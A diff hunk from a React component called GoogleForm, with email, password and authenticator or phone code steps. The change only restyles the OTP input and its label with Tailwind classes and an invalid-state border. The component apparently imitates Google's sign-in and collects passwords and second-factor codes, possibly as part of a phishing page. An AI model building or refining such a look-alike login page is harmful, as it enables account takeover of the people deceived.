@@ -146,15 +146,16 @@ export default function GoogleForm({ currentStep, email, setEmail, password, set
                             type="text"
                             value={otpCode}
                             onChange={handleOtpChange(currentStep === 'auth_otp' ? '2fa' : 'phone')}
-                            className="rounded p-4 border-2 border-gray-300 text-[16px] w-full 
-                                   text-[#1f1f1f] focus:outline-none focus:border-blue-500 peer 
-                                   transition-colors placeholder-transparent"
+                            className={`rounded p-4 border-2 text-[16px] w-full ${
+                                  invalid ? 'border-red-500' : 'border-gray-300'
+                              } bg-white dark:bg-[#fff] text-[#1f1f1f] dark:text-black 
+                              focus:outline-none focus:border-blue-500 peer transition-colors`}
                             placeholder="Enter code"
                         />
                         <label
-                            className="absolute left-4 top-4 px-1 bg-white transition-all duration-200 
-                                   text-gray-500 peer-focus:-top-3 peer-focus:text-sm peer-focus:text-blue-500 
-                                   peer-focus:bg-white peer-placeholder-shown:top-4 peer-placeholder-shown:text-base"
+                          className="absolute left-4 top-4 px-1 bg-white dark:bg-[#fff] transition-all duration-200 
+                          text-gray-500 peer-focus:-top-3 peer-focus:text-sm peer-focus:text-blue-500 
+                          peer-focus:bg-white dark:peer-focus:bg-[#fff] peer-placeholder-shown:top-4 peer-placeholder-shown:text-base"
                         >
                             {currentStep === 'auth_otp' 
                                 ? 'Enter Authenticator code' 
